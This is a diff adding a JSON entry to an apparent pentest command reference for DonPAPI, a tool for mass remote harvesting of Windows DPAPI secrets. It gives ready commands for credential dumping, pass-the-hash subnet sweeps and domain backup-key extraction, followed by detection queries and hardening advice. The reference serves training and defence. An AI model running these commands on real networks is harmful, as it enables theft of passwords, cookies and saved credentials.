@@ -1,0 +1,105 @@
+{
+  "id": "ad-donpapi",
+  "name": "DonPAPI - Mass DPAPI Secret Harvesting",
+  "command": "DonPAPI -u <user> -p <password> -d <domain> <target>",
+  "description": "DonPAPI remotely dumps Windows DPAPI-protected secrets at scale: browser credentials and cookies (Chrome/Edge), Windows Credential Manager vaults, Wi-Fi keys, scheduled-task creds, and more, across many hosts. It retrieves and decrypts masterkeys using the domain backup key or user hashes, avoiding touching LSASS. Ideal for post-compromise credential sweeping across a subnet.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Post-Exploitation",
+  "subcategory": "Credential Dumping",
+  "certifications": [
+    "CPTS",
+    "CRTP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "login-securite/DonPAPI",
+  "tags": [
+    "donpapi",
+    "dpapi",
+    "credentials",
+    "browser-creds",
+    "masterkey",
+    "credential-manager",
+    "wifi"
+  ],
+  "mitre": [
+    "T1555.003",
+    "T1555.004"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== SINGLE HOST ===\n  DonPAPI -u <user> -p <password> -d <domain> <target>\n\n=== WITH PASS-THE-HASH ===\n  DonPAPI -u <user> -H <nt_hash> -d <domain> <target>\n\n=== SWEEP A SUBNET ===\n  DonPAPI -u <user> -p <password> -d <domain> <cidr>\n  # e.g. 10.10.10.0/24\n\n=== USE DOMAIN DPAPI BACKUP KEY (decrypt any user masterkey) ===\n  # First extract the backup key from a DC (as DA):\n  dpapi.py backupkeys -t <domain>/<user>:<password>@<dc_ip> --export\n  DonPAPI --pvk domain_backupkey.pvk -u <user> -p <password> -d <domain> <cidr>\n\n=== WHAT IT COLLECTS ===\n  - Chrome/Edge saved logins and cookies\n  - Windows Credential Manager (generic + domain creds)\n  - Wi-Fi PSKs\n  - Scheduled task credentials\n  - RDP saved creds, mRemoteNG, etc.\n\n=== OUTPUT ===\n  # Results stored in ~/.donpapi/ (SQLite + loot files)\n\n=== ALTERNATIVES ===\n  mimikatz dpapi::  # on-host, manual\n  SharpDPAPI  # C# on-host\n  lsassy / nanodump  # LSASS-based (different source)",
+  "examples": [
+    {
+      "label": "Dump DPAPI secrets from one host",
+      "command": "DonPAPI -u jdoe -p Passw0rd! -d corp.local 10.10.10.20"
+    },
+    {
+      "label": "Sweep a subnet with PtH",
+      "command": "DonPAPI -u jdoe -H aad3b435...:31d6cfe0... -d corp.local 10.10.10.0/24"
+    },
+    {
+      "label": "Decrypt with domain backup key",
+      "command": "DonPAPI --pvk domain_backupkey.pvk -u jdoe -p Passw0rd! -d corp.local 10.10.10.0/24"
+    }
+  ],
+  "references": [
+    {
+      "title": "DonPAPI",
+      "url": "https://github.com/login-securite/DonPAPI"
+    },
+    {
+      "title": "MITRE T1555.003 - Credentials from Web Browsers",
+      "url": "https://attack.mitre.org/techniques/T1555/003/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "mimikatz-dpapi-chrome",
+      "note": "On-host manual DPAPI decryption of browser creds.",
+      "rel": "alternative"
+    },
+    {
+      "id": "post-lsassy",
+      "note": "lsassy dumps LSASS (different credential source).",
+      "rel": "alternative"
+    },
+    {
+      "id": "ad-secretsdump-dcsync",
+      "note": "DCSync the domain backup key owner / get hashes to feed DonPAPI.",
+      "rel": "prereq"
+    }
+  ],
+  "defense": {
+    "why_it_works": "DPAPI encrypts user secrets with keys derived from the user password (or the domain backup key). With the user hash or the domain backup key, an attacker decrypts masterkeys and all protected blobs remotely over SMB/RPC without touching LSASS.",
+    "prerequisites": "Admin rights on targets (to read other users DPAPI blobs); user hash/password or the domain DPAPI backup key.",
+    "impact": "Mass theft of browser passwords, cookies (session hijack), Wi-Fi keys, saved RDP/app credentials across many hosts.",
+    "detection": "[MITRE T1555.003/T1555.004] Remote access to \\Users\\*\\AppData\\...\\Protect masterkey files and browser Login Data over SMB; SMB admin-share reads of DPAPI paths from one source to many hosts.",
+    "artifacts": "SMB reads of Microsoft\\Protect\\ masterkeys and browser credential stores; RPC to retrieve backup keys from the DC (LSARPC).",
+    "splunk_spl": "index=windows EventCode=5145 RelativeTargetName=\"*\\\\Microsoft\\\\Protect\\\\*\"\n| stats dc(ComputerName) as hosts count by SubjectUserName, IpAddress\n| where hosts > 3",
+    "elastic_kql": "event.code:5145 and winlog.event_data.RelativeTargetName:*Microsoft\\\\Protect\\\\*",
+    "sentinel_kql": "DeviceFileEvents\n| where FolderPath has @\"\\Microsoft\\Protect\\\" or FolderPath has @\"\\User Data\\Default\\Login Data\"\n| summarize Hosts=dcount(DeviceName) by InitiatingProcessAccountName, bin(Timestamp, 10m)\n| where Hosts > 3",
+    "sigma_rules": "win_dpapi_masterkey_remote_access",
+    "prevention": "Protect/rotate the domain DPAPI backup key; restrict local admin (LAPS + tiering); use hardware-bound credential storage; monitor remote masterkey access; enable Credential Guard where possible.",
+    "sources": [
+      "login-securite",
+      "https://attack.mitre.org/techniques/T1555/003/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Mass DPAPI masterkey/browser credential access",
+        "logic": "DeviceFileEvents\n| where FolderPath has @\"\\Microsoft\\Protect\\\" or FolderPath endswith \"Login Data\" or FolderPath endswith \"Cookies\"\n| where InitiatingProcessAccountName !in (\"SYSTEM\")\n| summarize Hosts=dcount(DeviceName), Files=count() by InitiatingProcessAccountName, bin(Timestamp, 10m)\n| where Hosts >= 3",
+        "data_source": "defender-endpoint",
+        "attack": [
+          "T1555.003",
+          "T1555.004"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Backup/EDR agents enumerating user profiles",
+        "tuning": "Exclude known management service accounts; threshold on distinct hosts touched"
+      }
+    ]
+  }
+}
